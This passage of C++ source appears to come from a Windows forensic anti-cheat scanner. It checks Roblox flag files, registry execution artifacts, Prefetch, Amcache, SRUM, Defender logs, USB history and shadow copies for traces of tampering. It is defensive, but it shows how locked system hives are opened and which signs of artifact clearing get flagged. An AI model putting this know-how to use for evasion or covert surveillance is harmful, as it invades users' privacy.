            ULONGLONG mtime = 0;
            if (hf != INVALID_HANDLE_VALUE) {
                FILETIME ft; GetFileTime(hf, nullptr, nullptr, &ft); CloseHandle(hf);
                mtime = ((ULONGLONG)ft.dwHighDateTime << 32) | ft.dwLowDateTime;
            }
            files.push_back({ mtime, fp });
        } while (FindNextFileA(h, &fd));
        FindClose(h);
    }
    std::sort(files.begin(), files.end(), [](auto& a, auto& b) { return a.first > b.first; });
    for (size_t i = 0; i < std::min(files.size(), (size_t)5); ++i) {
        std::ifstream ifs(files[i].second);
        if (!ifs) continue;
        string content((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
        results.push_back(content);
    }
    return results;
}

static vector<string> ScanRobloxFlags() {
    vector<string> hits;
    char localApp[MAX_PATH] = {};
    GetEnvironmentVariableA("LOCALAPPDATA", localApp, MAX_PATH);
    string base = string(localApp) + "\\Roblox";
    vector<string> dirs = { base + "\\ClientSettings", base + "\\Versions" };
    static const vector<string> suspiciousFlags = {
        "FFlagDebugGraphicsPreferVulkan", "FFlagDebugDisableTelemetry",
        "DFFlagDisableDeferredShadows", "FFlagGameBasicSettingsFramerateCap",
        "FFlagFixGraphicsQuality", "FFlagDebugD3D11ForceEnableDebugMode",
    };
    std::function<void(const string&, vector<string>&)> findJson = [&](const string& dir, vector<string>& out) {
        WIN32_FIND_DATAA fd;
        HANDLE h = FindFirstFileA((dir + "\\*").c_str(), &fd);
        if (h == INVALID_HANDLE_VALUE) return;
        do {
            string name = fd.cFileName;
            if (name == "." || name == "..") continue;
            string full = dir + "\\" + name;
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) findJson(full, out);
            else if (Lower(name).find(".json") != string::npos) out.push_back(full);
        } while (FindNextFileA(h, &fd));
        FindClose(h);
        };
    for (const auto& d : dirs) {
        DWORD attr = GetFileAttributesA(d.c_str());
        if (attr == INVALID_FILE_ATTRIBUTES || !(attr & FILE_ATTRIBUTE_DIRECTORY)) continue;
        vector<string> jsonFiles;
        findJson(d, jsonFiles);
        for (const auto& fp : jsonFiles) {
            std::ifstream ifs(fp);
            string data((std::istreambuf_iterator<char>(ifs)), std::istreambuf_iterator<char>());
            string dl = Lower(data);
            for (const auto& flag : suspiciousFlags)
                if (dl.find(Lower(flag)) != string::npos)
                    hits.push_back("Modified FFlag: " + flag + " in " + fp);
        }
    }
    if (hits.empty()) hits.push_back("Roblox FFlags: No suspicious flags found");
    return hits;
}

// =========================================================================
//  Trinity: Quick native registry + file checks
// =========================================================================

// ── Services startup / install date scan ─────────────────────────────────────
static string CheckServicesForKeywords() {
    HKEY hServices;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Services", 0,
        KEY_READ | KEY_ENUMERATE_SUB_KEYS, &hServices) != ERROR_SUCCESS)
        return "Services: Could not open Services registry key";

    vector<string> hits;
    char svcName[256]; DWORD svcNameLen = sizeof(svcName);
    FILETIME lastWrite;

    for (DWORD i = 0;
        RegEnumKeyExA(hServices, i, svcName, &svcNameLen,
            nullptr, nullptr, nullptr, &lastWrite) == ERROR_SUCCESS;
        ++i, svcNameLen = sizeof(svcName))
    {
        HKEY hSvc;
        if (RegOpenKeyExA(hServices, svcName, 0, KEY_READ, &hSvc) != ERROR_SUCCESS) continue;

        char imagePath[2048] = {}; DWORD ipSz = sizeof(imagePath);
        char displayName[512] = {}; DWORD dnSz = sizeof(displayName);
        DWORD startType = 0xFFFF;  DWORD stSz = sizeof(startType);
        RegQueryValueExA(hSvc, "ImagePath", nullptr, nullptr, (LPBYTE)imagePath, &ipSz);
        RegQueryValueExA(hSvc, "DisplayName", nullptr, nullptr, (LPBYTE)displayName, &dnSz);
        RegQueryValueExA(hSvc, "Start", nullptr, nullptr, (LPBYTE)&startType, &stSz);
        RegCloseKey(hSvc);

        string name(svcName);
        string ip(imagePath);
        string dn(displayName);
        string nameLow = Lower(name), ipLow = Lower(ip), dnLow = Lower(dn);

        bool kwHit = false; string hitKw;
        for (auto& kw : KW)
            if (nameLow.find(kw) != string::npos ||
                ipLow.find(kw) != string::npos ||
                dnLow.find(kw) != string::npos)
            {
                kwHit = true; hitKw = kw; break;
            }

        // Flag services whose executable lives in user-writable directories
        bool suspiciousPath = false;
        if (!ipLow.empty()) {
            const char* suspPfx[] = {
                "c:\\users\\", "c:\\programdata\\", "c:\\temp\\",
                "c:\\windows\\temp\\", nullptr
            };
            for (int k = 0; suspPfx[k]; k++)
                if (ipLow.find(suspPfx[k]) != string::npos) { suspiciousPath = true; break; }
        }

        if (!kwHit && !suspiciousPath) continue;

        ULONGLONG ft = ((ULONGLONG)lastWrite.dwHighDateTime << 32) | lastWrite.dwLowDateTime;
        string ts = (ft > 0) ? TrinityFiletimeToString(ft) : "unknown";

        const char* startStrs[] = { "Boot","System","Auto","Manual","Disabled" };
        string startStr = (startType <= 4) ? startStrs[startType] : std::to_string(startType);

        string entry = "Service: " + name;
        if (!dn.empty() && dn != name) entry += " (" + dn + ")";
        entry += " | Start: " + startStr + " | Last modified: " + ts;
        if (!ip.empty()) entry += " | ImagePath: " + ip;
        if (kwHit)         entry += "  [KEYWORD: " + hitKw + "]";
        if (suspiciousPath) entry += "  [SUSPICIOUS PATH]";
        hits.push_back(entry);
    }
    RegCloseKey(hServices);

    if (hits.empty())
        return "Services: No keyword matches or suspicious ImagePath locations found";
    string r = "Services (" + std::to_string(hits.size()) + " hit(s)):\n";
    for (auto& h2 : hits) r += "  " + h2 + "\n";
    return r;
}

static string CheckRunKeysNative() {
    vector<string> hits;
    struct { HKEY hive; const char* path; } paths[] = {
        { HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" },
        { HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce" },
        { HKEY_CURRENT_USER,  "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" },
        { HKEY_CURRENT_USER,  "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce" },
    };
    for (auto& p : paths) {
        HKEY hKey;
        if (RegOpenKeyExA(p.hive, p.path, 0, KEY_READ, &hKey) != ERROR_SUCCESS) continue;
        char name[16384]; DWORD nameLen; BYTE data[16384]; DWORD dataLen, type;
        for (DWORD i = 0; ; ++i) {
            nameLen = sizeof(name); dataLen = sizeof(data) - 1;
            if (RegEnumValueA(hKey, i, name, &nameLen, nullptr, &type, data, &dataLen) != ERROR_SUCCESS) break;
            data[dataLen] = 0;
            string combined = string(name, nameLen) + " " + string((char*)data);
            string combinedLow = Lower(combined);
            for (auto& kw : KW) {
                if (combinedLow.find(kw) != string::npos) {
                    hits.push_back("Run Key: " + string(p.path) + "\\" +
                        string(name, nameLen) + " = " + string((char*)data));
                    break;
                }
            }
        }
        RegCloseKey(hKey);
    }
    if (hits.empty()) return "Run Keys: Clean";
    string r;
    for (auto& h : hits) r += h + "\n";
    return r;
}

static vector<string> ScanRecentItemsNative() {
    vector<string> hits;
    WIN32_FIND_DATAA ufd;
    HANDLE uh = FindFirstFileA("C:\\Users\\*", &ufd);
    if (uh == INVALID_HANDLE_VALUE) return hits;
    do {
        if (!(ufd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
        string uname = ufd.cFileName;
        if (uname == "." || uname == "..") continue;
        string recent = "C:\\Users\\" + uname + "\\AppData\\Roaming\\Microsoft\\Windows\\Recent";
        WIN32_FIND_DATAA fd;
        HANDLE h = FindFirstFileA((recent + "\\*").c_str(), &fd);
        if (h == INVALID_HANDLE_VALUE) continue;
        do {
            string fl = Lower(fd.cFileName);
            for (auto& kw : KW)
                if (fl.find(kw) != string::npos) {
                    hits.push_back("Recent Item: " + string(fd.cFileName) + " [user: " + uname + "]");
                    break;
                }
        } while (FindNextFileA(h, &fd));
        FindClose(h);
    } while (FindNextFileA(uh, &ufd));
    FindClose(uh);
    return hits;
}

static vector<string> ScanUserAssistForKeywords() {
    vector<string> hits;
    auto Rot13 = [](const string& s) {
        string r = s;
        for (char& c : r) {
            if (c >= 'a' && c <= 'z') c = (char)((c - 'a' + 13) % 26 + 'a');
            else if (c >= 'A' && c <= 'Z') c = (char)((c - 'A' + 13) % 26 + 'A');
        }
        return r;
        };
    HKEY hUA;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist",
        0, KEY_READ, &hUA) != ERROR_SUCCESS) return hits;
    char guidBuf[256]; DWORD guidLen = sizeof(guidBuf);
    for (DWORD i = 0; RegEnumKeyExA(hUA, i, guidBuf, &guidLen, nullptr, nullptr, nullptr, nullptr) == ERROR_SUCCESS; ++i, guidLen = sizeof(guidBuf)) {
        string cntPath = string(guidBuf) + "\\Count";
        HKEY hCnt;
        if (RegOpenKeyExA(hUA, cntPath.c_str(), 0, KEY_READ, &hCnt) != ERROR_SUCCESS) continue;
        char name[16384]; DWORD nameLen; BYTE data[256]; DWORD dataLen, type;
        for (DWORD j = 0; ; ++j) {
            nameLen = sizeof(name); dataLen = sizeof(data);
            if (RegEnumValueA(hCnt, j, name, &nameLen, nullptr, &type, data, &dataLen) != ERROR_SUCCESS) break;
            string decoded = Rot13(string(name, nameLen));
            string decodedLow = Lower(decoded);
            for (auto& kw : KW) {
                if (decodedLow.find(kw) != string::npos) {
                    string ts = "unknown";
                    if (dataLen >= 16) {
                        DWORD lo, hi;
                        memcpy(&lo, data + 8, 4); memcpy(&hi, data + 12, 4);
                        ULONGLONG ft2 = ((ULONGLONG)hi << 32) | lo;
                        if (ft2) ts = TrinityFiletimeToString(ft2);
                    }
                    hits.push_back("UserAssist: " + decoded + " | ts: " + ts);
                    break;
                }
            }
        }
        RegCloseKey(hCnt);
    }
    RegCloseKey(hUA);
    return hits;
}

// =========================================================================
//  Trinity: Integrity + extra checks (all formerly missing)
// =========================================================================

// ── Prefetch integrity ────────────────────────────────────────────────────────
static string CheckPrefetchIntegrity() {
    const string prefDir = "C:\\Windows\\Prefetch";
    DWORD attr = GetFileAttributesA(prefDir.c_str());
    if (attr == INVALID_FILE_ATTRIBUTES || !(attr & FILE_ATTRIBUTE_DIRECTORY))
        return "Prefetch CLEARED: Prefetch directory does not exist";

    int count = 0;
    ULONGLONG oldestMtime = ULLONG_MAX;
    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA((prefDir + "\\*.pf").c_str(), &fd);
    if (h != INVALID_HANDLE_VALUE) {
        do {
            count++;
            string fp = prefDir + "\\" + fd.cFileName;
            HANDLE hf = CreateFileA(fp.c_str(), GENERIC_READ,
                FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
            if (hf != INVALID_HANDLE_VALUE) {
                FILETIME ft; GetFileTime(hf, nullptr, nullptr, &ft); CloseHandle(hf);
                ULONGLONG mt = ((ULONGLONG)ft.dwHighDateTime << 32) | ft.dwLowDateTime;
                if (mt && mt < oldestMtime) oldestMtime = mt;
            }
        } while (FindNextFileA(h, &fd));
        FindClose(h);
    }
    if (count == 0) {
        // Try to get Windows install date for context
        HKEY hk; string installDate;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hk) == ERROR_SUCCESS) {
            DWORD val; DWORD sz = sizeof(val);
            if (RegQueryValueExA(hk, "InstallDate", nullptr, nullptr, (LPBYTE)&val, &sz) == ERROR_SUCCESS) {
                time_t t = (time_t)val; struct tm tm_info; gmtime_s(&tm_info, &t);
                char buf[32]; strftime(buf, sizeof(buf), "%Y-%m-%d", &tm_info);
                installDate = buf;
            }
            RegCloseKey(hk);
        }
        return "Prefetch CLEARED: No .pf files found (Windows installed " + installDate + ")";
    }
    if (count < 5) {
        string ts = "unknown";
        if (oldestMtime != ULLONG_MAX) ts = TrinityFiletimeToString(oldestMtime);
        return "Prefetch CLEARED: Only " + std::to_string(count) +
            " .pf files found but oldest prefetch file is " + ts;
    }
    return "Prefetch OK: " + std::to_string(count) + " files found";
}

static HANDLE NtOpenLockedFile(const wstring& win32Path); // forward declaration

// ── Amcache integrity ─────────────────────────────────────────────────────────
static string CheckAmcacheIntegrity() {
    const string hive = "C:\\Windows\\AppCompat\\Programs\\Amcache.hve";
    if (GetFileAttributesA(hive.c_str()) == INVALID_FILE_ATTRIBUTES)
        return "Amcache Integrity: Amcache.hve not found";

    HANDLE hf = CreateFileA(hive.c_str(), GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    // Amcache.hve is held by the AppCompat host; fall back to NtOpenLockedFile
    // if the normal share-mode open fails.
    if (hf == INVALID_HANDLE_VALUE)
        hf = NtOpenLockedFile(wstring(hive.begin(), hive.end()));
    if (hf == INVALID_HANDLE_VALUE)
        return "Amcache Integrity:\n  Amcache.hve: file exists but could not be opened"
        " (locked by OS - try running as SYSTEM or from a VSS snapshot)";
    ULONGLONG mtime = 0; ULONGLONG fileSize = 0;
    string ts = "unknown";
    if (hf != INVALID_HANDLE_VALUE) {
        FILETIME ft; GetFileTime(hf, nullptr, nullptr, &ft);
        LARGE_INTEGER sz = {}; GetFileSizeEx(hf, &sz);
        CloseHandle(hf);
        mtime = ((ULONGLONG)ft.dwHighDateTime << 32) | ft.dwLowDateTime;
        fileSize = (ULONGLONG)sz.QuadPart;
        ts = TrinityFiletimeToString(mtime);
    }
    FILETIME nowFt; GetSystemTimeAsFileTime(&nowFt);
    ULONGLONG now = ((ULONGLONG)nowFt.dwHighDateTime << 32) | nowFt.dwLowDateTime;
    double ageMin = (mtime > 0) ? (double)(now - mtime) / 600000000.0 : 9999.0;

    string r = "Amcache Integrity:\n  Amcache.hve last modified: " + ts +
        "\n  Amcache.hve size: " + std::to_string(fileSize) + " bytes";
    if (ageMin < 20)
        r += "\n  SUSPICIOUS: Amcache.hve modified " + std::to_string((int)ageMin) + " minutes ago";
    return r;
}

// ── Shimcache integrity ───────────────────────────────────────────────────────
static string CheckShimcacheIntegrity() {
    const string hive = "C:\\Windows\\System32\\config\\SYSTEM";
    if (GetFileAttributesA(hive.c_str()) == INVALID_FILE_ATTRIBUTES)
        return "Shimcache Integrity: SYSTEM hive not found";

    HANDLE hf = CreateFileA(hive.c_str(), GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    // SYSTEM hive is held by the kernel; fall back to NtOpenLockedFile.
    if (hf == INVALID_HANDLE_VALUE)
        hf = NtOpenLockedFile(wstring(hive.begin(), hive.end()));
    if (hf == INVALID_HANDLE_VALUE)
        return "Shimcache Integrity:\n  SYSTEM hive: file exists but could not be opened"
        " (locked by kernel - try running as SYSTEM or from a VSS snapshot)";
    ULONGLONG mtime = 0; string ts = "unknown";
    if (hf != INVALID_HANDLE_VALUE) {
        FILETIME ft; GetFileTime(hf, nullptr, nullptr, &ft); CloseHandle(hf);
        mtime = ((ULONGLONG)ft.dwHighDateTime << 32) | ft.dwLowDateTime;
        ts = TrinityFiletimeToString(mtime);
    }
    FILETIME nowFt; GetSystemTimeAsFileTime(&nowFt);
    ULONGLONG now = ((ULONGLONG)nowFt.dwHighDateTime << 32) | nowFt.dwLowDateTime;
    double ageMin = (mtime > 0) ? (double)(now - mtime) / 600000000.0 : 9999.0;

    string r = "Shimcache Integrity:\n  SYSTEM hive last modified: " + ts;
    if (ageMin < 30)
        r += "\n  SUSPICIOUS: Recent SYSTEM hive modification may indicate shimcache tampering!";
    return r;
}

// ── SRUM integrity ────────────────────────────────────────────────────────────
static string CheckSrumIntegrity() {
    const wstring db = L"C:\\Windows\\System32\\sru\\SRUDB.dat";
    if (GetFileAttributesW(db.c_str()) == INVALID_FILE_ATTRIBUTES)
        return "SRUM Integrity: SRUDB.dat not found";

    // SRUDB.dat is held open exclusively by the SRUM service — a plain
    // CreateFile with FILE_SHARE_READ returns 0 bytes because the ESE engine
    // has the file mapped.  Use NtOpenLockedFile to bypass the share-mode check
    // and get the real on-disk size, matching what SrumECmd sees via VSS.
    HANDLE hf = NtOpenLockedFile(db);
    if (hf == INVALID_HANDLE_VALUE) {
        hf = CreateFileW(db.c_str(), GENERIC_READ,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            nullptr, OPEN_EXISTING,
            FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_SEQUENTIAL_SCAN, nullptr);
    }
    ULONGLONG fileSize = 0; string ts = "unknown";
    if (hf != INVALID_HANDLE_VALUE) {
        FILETIME ft = {}; GetFileTime(hf, nullptr, nullptr, &ft);
        LARGE_INTEGER sz = {}; GetFileSizeEx(hf, &sz);
        CloseHandle(hf);
        fileSize = (ULONGLONG)sz.QuadPart;
        if (ft.dwHighDateTime || ft.dwLowDateTime)
            ts = TrinityFiletimeToString(((ULONGLONG)ft.dwHighDateTime << 32) | ft.dwLowDateTime);
    }
    string result = "SRUM Integrity:\n  SRUDB.dat size: " + std::to_string(fileSize) +
        " bytes\n  Last modified: " + ts;
    if (fileSize == 0)
        result += "\n  [!] WARNING: reported size is 0 - SRUDB.dat may be locked or wiped";
    return result;
}

// ── Windows Defender integrity ────────────────────────────────────────────────
static string CheckDefenderIntegrity() {
    char sysroot[MAX_PATH] = {};
    GetEnvironmentVariableA("SYSTEMROOT", sysroot, MAX_PATH);
    string logPath = string(sysroot) +
        "\\System32\\winevt\\Logs\\"
        "Microsoft-Windows-Windows Defender%4Operational.evtx";

    string report = "Defender Integrity:";
    if (GetFileAttributesA(logPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
        report += "\n  Windows Defender log: File missing (directly deleted?)";
        return report;
    }
    WIN32_FILE_ATTRIBUTE_DATA fa = {};
    GetFileAttributesExA(logPath.c_str(), GetFileExInfoStandard, &fa);
    ULONGLONG size = ((ULONGLONG)fa.nFileSizeHigh << 32) | fa.nFileSizeLow;
    if (size < 70000) {
        report += "\n  Windows Defender log: Near-empty (" + std::to_string(size) + " bytes) — likely cleared";
        return report;
    }

    // Query last 100 events via wevtutil
    SECURITY_ATTRIBUTES sa = { sizeof(sa), nullptr, TRUE };
    HANDLE hRead, hWrite; CreatePipe(&hRead, &hWrite, &sa, 0); SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);
    HANDLE hNulIn = CreateFileA("NUL", GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
        &sa, OPEN_EXISTING, 0, nullptr);
    STARTUPINFOA si = { sizeof(si) }; si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdInput = hNulIn; si.hStdOutput = hWrite; si.hStdError = hWrite; si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {};
    string cmd = "wevtutil.exe qe \"Microsoft-Windows-Windows Defender/Operational\""
        " /c:100 /rd:true /f:xml";
    string xml;
    if (CreateProcessA(nullptr, cmd.data(), nullptr, nullptr, TRUE, CREATE_NO_WINDOW,
        nullptr, nullptr, &si, &pi)) {
        CloseHandle(hWrite);
        if (hNulIn != INVALID_HANDLE_VALUE) CloseHandle(hNulIn);
        char buf[8192]; DWORD n;
        while (ReadFile(hRead, buf, sizeof(buf), &n, nullptr) && n) xml.append(buf, n);
        WaitForSingleObject(pi.hProcess, 30000);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    }
    else { CloseHandle(hWrite); if (hNulIn != INVALID_HANDLE_VALUE) CloseHandle(hNulIn); }
    CloseHandle(hRead);

    string xmlLow = Lower(xml);
    if (xml.find("5007") != string::npos && xmlLow.find("exclusion") != string::npos)
        report += "\n  Defender: Exclusion added (event 5007 detected)";
    if (xml.find("5001") != string::npos)
        report += "\n  Defender: Real-time protection DISABLED (event 5001 detected)";
    if (xml.find("5007") == string::npos && xml.find("5001") == string::npos)
        report += "\n  Defender: Log present and normal";
    return report;
}

// ── BAM service disabled / cleared check ─────────────────────────────────────
static string CheckBamIntegrity() {
    // Check if BAM service is disabled
    HKEY hSvc;
    LONG rv = RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Services\\bam", 0, KEY_READ, &hSvc);
    if (rv == ERROR_FILE_NOT_FOUND)
        return "BAM DISABLED: BAM service registry key does not exist (service deleted)";
    if (rv != ERROR_SUCCESS)
        return "BAM DISABLED: BAM registry keys not found";
    DWORD startVal = 0; DWORD sz = sizeof(startVal);
    RegQueryValueExA(hSvc, "Start", nullptr, nullptr, (LPBYTE)&startVal, &sz);
    RegCloseKey(hSvc);
    if (startVal == 4)
        return "BAM DISABLED: BAM service is set to Disabled (Start=4)";

    // Check for very low entry count (cleared)
    HKEY hBam;
    rv = RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Services\\bam\\State\\UserSettings",
        0, KEY_READ, &hBam);
    if (rv != ERROR_SUCCESS)
        rv = RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "SYSTEM\\CurrentControlSet\\Services\\bam\\UserSettings",
            0, KEY_READ, &hBam);
    if (rv != ERROR_SUCCESS)
        return "BAM DISABLED: BAM registry keys not found (service disabled or deleted)";

    int totalEntries = 0;
    char sidBuf[256]; DWORD sidLen = sizeof(sidBuf);
    for (DWORD i = 0; RegEnumKeyExA(hBam, i, sidBuf, &sidLen, nullptr,
        nullptr, nullptr, nullptr) == ERROR_SUCCESS; ++i, sidLen = sizeof(sidBuf)) {
        HKEY hSid;
        if (RegOpenKeyExA(hBam, sidBuf, 0, KEY_READ, &hSid) != ERROR_SUCCESS) continue;
        char name[1024]; DWORD nameLen;
        for (DWORD j = 0; ; ++j) {
            nameLen = sizeof(name);
            if (RegEnumValueA(hSid, j, name, &nameLen, nullptr, nullptr, nullptr, nullptr)
                != ERROR_SUCCESS) break;
            totalEntries++;
        }
        RegCloseKey(hSid);
    }
    RegCloseKey(hBam);

    if (totalEntries == 0)
        return "BAM CLEARED: No entries found in BAM UserSettings (cleared or never ran)";
    if (totalEntries < 5)
        return "BAM CLEARED: Only " + std::to_string(totalEntries) + " BAM entries — likely cleared";
    return "BAM OK: " + std::to_string(totalEntries) + " entries found";
}

// ── USB full history (USBSTOR registry) ──────────────────────────────────────
static string CheckUsbStorHistory() {
    const char* usbstorPath = "SYSTEM\\CurrentControlSet\\Enum\\USBSTOR";
    HKEY hUsb;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, usbstorPath, 0,
        KEY_READ | KEY_ENUMERATE_SUB_KEYS, &hUsb) != ERROR_SUCCESS)
        return "USB History: USBSTOR key not found or access denied";

    vector<string> devices;
    char devClass[256]; DWORD devClassLen = sizeof(devClass);
    for (DWORD i = 0; RegEnumKeyExA(hUsb, i, devClass, &devClassLen,
        nullptr, nullptr, nullptr, nullptr) == ERROR_SUCCESS;
        ++i, devClassLen = sizeof(devClass)) {
        HKEY hClass;
        if (RegOpenKeyExA(hUsb, devClass, 0, KEY_READ | KEY_ENUMERATE_SUB_KEYS, &hClass)
            != ERROR_SUCCESS) continue;
        char serial[256]; DWORD serialLen = sizeof(serial);
        for (DWORD j = 0; RegEnumKeyExA(hClass, j, serial, &serialLen,
            nullptr, nullptr, nullptr, nullptr) == ERROR_SUCCESS;
            ++j, serialLen = sizeof(serial)) {
            HKEY hSerial;
            string serialPath = string(devClass) + "\\" + serial;
            if (RegOpenKeyExA(hClass, serial, 0, KEY_READ, &hSerial) == ERROR_SUCCESS) {
                char friendlyName[512] = {}; DWORD fnSz = sizeof(friendlyName);
                RegQueryValueExA(hSerial, "FriendlyName", nullptr, nullptr,
                    (LPBYTE)friendlyName, &fnSz);
                char mfg[256] = {}; DWORD mfgSz = sizeof(mfg);
                RegQueryValueExA(hSerial, "Mfg", nullptr, nullptr, (LPBYTE)mfg, &mfgSz);
                // Clean raw INF resource strings like "@disk.inf,%genmanufacturer%;(Standard disk drives)"
                // by keeping only the human-readable portion after the last semicolon.
                string mfgStr = mfg;
                if (!mfgStr.empty() && mfgStr[0] == '@') {
                    size_t semi = mfgStr.rfind(';');
                    if (semi != string::npos && semi + 1 < mfgStr.size())
                        mfgStr = mfgStr.substr(semi + 1);
                    else
                        mfgStr.clear(); // nothing useful after stripping
                }

                string entry = "USB Device: ";
                if (friendlyName[0]) entry += string(friendlyName);
                else entry += string(devClass);
                entry += " | Serial: " + string(serial);
                if (!mfgStr.empty()) entry += " | Mfg: " + mfgStr;

                // DEVPROP values in the Properties subkeys are stored as REG_BINARY with a
                // 4-byte DEVPROPTYPE header followed by the actual payload.  For FILETIME
                // values (DEVPROP_TYPE_FILETIME = 0x0040) the total size is 12 bytes, not 8.
                // Reading only 8 bytes from offset 0 was returning the type header as the
                // timestamp, producing garbage results.  Corrected: read 12 bytes, skip the
                // first 4 (the type word), then memcpy the remaining 8 as the FILETIME.
                auto ReadDevPropFiletime = [](HKEY hParent, const char* subPath) -> string {
                    HKEY hP;
                    if (RegOpenKeyExA(hParent, subPath, 0,
                        KEY_READ | KEY_ENUMERATE_SUB_KEYS, &hP) != ERROR_SUCCESS)
                        return "";
                    BYTE buf[12] = {}; DWORD bufSz = sizeof(buf); DWORD bufType;
                    bool ok = (RegQueryValueExA(hP, nullptr, nullptr, &bufType,
                        buf, &bufSz) == ERROR_SUCCESS && bufSz >= 12);
                    RegCloseKey(hP);
                    if (!ok) return "";
                    ULONGLONG ft = 0;
                    memcpy(&ft, buf + 4, 8); // skip 4-byte DEVPROPTYPE header
                    return (ft > 0) ? TrinityFiletimeToString(ft) : "";
                    };

                // 0064 = first install date, 0065 = last arrival (connected), 0066 = last removal
                string tsInstall = ReadDevPropFiletime(hSerial,
                    "Properties\\{83da6326-97a6-4088-9453-a1923f573b29}\\0064");
                string tsConnected = ReadDevPropFiletime(hSerial,
                    "Properties\\{83da6326-97a6-4088-9453-a1923f573b29}\\0065");
                string tsRemoved = ReadDevPropFiletime(hSerial,
                    "Properties\\{83da6326-97a6-4088-9453-a1923f573b29}\\0066");

                // Fallback: use the registry key's own LastWriteTime as "last seen" if
                // the DEVPROP subkeys are inaccessible (common on older Windows builds).
                if (tsInstall.empty() && tsConnected.empty()) {
                    FILETIME lwt = {};
                    if (RegQueryInfoKeyA(hSerial, nullptr, nullptr, nullptr, nullptr,
                        nullptr, nullptr, nullptr, nullptr, nullptr, nullptr, &lwt)
                        == ERROR_SUCCESS) {
                        ULONGLONG ft = ((ULONGLONG)lwt.dwHighDateTime << 32) | lwt.dwLowDateTime;
                        if (ft > 0) tsConnected = TrinityFiletimeToString(ft) + " (key write)";
                    }
                }

                if (!tsInstall.empty())   entry += " | First install: " + tsInstall;
                if (!tsConnected.empty()) entry += " | Last connected: " + tsConnected;
                if (!tsRemoved.empty())   entry += " | Last removed: " + tsRemoved;
                // Check for keyword hits
                string entryLow = Lower(entry);
                for (auto& kw : KW)
                    if (entryLow.find(kw) != string::npos) { entry += " [!KEYWORD HIT]"; break; }
                devices.push_back(entry);
                RegCloseKey(hSerial);
            }
        }
        RegCloseKey(hClass);
    }
    RegCloseKey(hUsb);

    if (devices.empty()) return "USB History: No USB storage devices found in registry";
    string r = "USB Storage History (" + std::to_string(devices.size()) + " device(s)):\n";
    for (auto& d : devices) r += "  " + d + "\n";
    return r;
}

// ── System restore / VSS snapshot enumeration ────────────────────────────────
static string CheckSystemRestorePoints() {
    // Use vssadmin to list existing shadow copies
    SECURITY_ATTRIBUTES sa = { sizeof(sa), nullptr, TRUE };
    HANDLE hRead, hWrite; CreatePipe(&hRead, &hWrite, &sa, 0); SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);
    HANDLE hNulIn = CreateFileA("NUL", GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
        &sa, OPEN_EXISTING, 0, nullptr);
    STARTUPINFOA si = { sizeof(si) }; si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdInput = hNulIn; si.hStdOutput = hWrite; si.hStdError = hWrite; si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {};
    string cmd = "vssadmin list shadows /for=C:";
    string out;
    if (CreateProcessA(nullptr, cmd.data(), nullptr, nullptr, TRUE, CREATE_NO_WINDOW,
        nullptr, nullptr, &si, &pi)) {
        CloseHandle(hWrite);
        if (hNulIn != INVALID_HANDLE_VALUE) CloseHandle(hNulIn);
        char buf[8192]; DWORD n;
        while (ReadFile(hRead, buf, sizeof(buf), &n, nullptr) && n) out.append(buf, n);
        WaitForSingleObject(pi.hProcess, 20000);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    }
    else { CloseHandle(hWrite); if (hNulIn != INVALID_HANDLE_VALUE) CloseHandle(hNulIn); }
    CloseHandle(hRead);

    if (out.empty() || Lower(out).find("no items") != string::npos ||
        Lower(out).find("no shadow copies") != string::npos)
        return "System Restore: No VSS shadow copies found on C: — restore points may have been deleted";

    // Count shadow copy entries
    int count = 0;
    size_t pos = 0;
    while ((pos = out.find("Shadow Copy ID:", pos)) != string::npos) { count++; pos++; }
    if (count == 0)
        return "System Restore: No restore points found";

    string r = "System Restore: " + std::to_string(count) + " VSS shadow copy(s) found on C:";
    // Extract creation times if present
    std::istringstream ss(out); string line;
    vector<string> dates;
    while (std::getline(ss, line)) {
        string ll = Lower(line);
        if (ll.find("creation time:") != string::npos) {
            size_t c = line.find(':');
            if (c != string::npos) dates.push_back("  " + line.substr(c + 1));
        }
    }
    for (auto& d : dates) r += "\n" + d;
    return r;
}

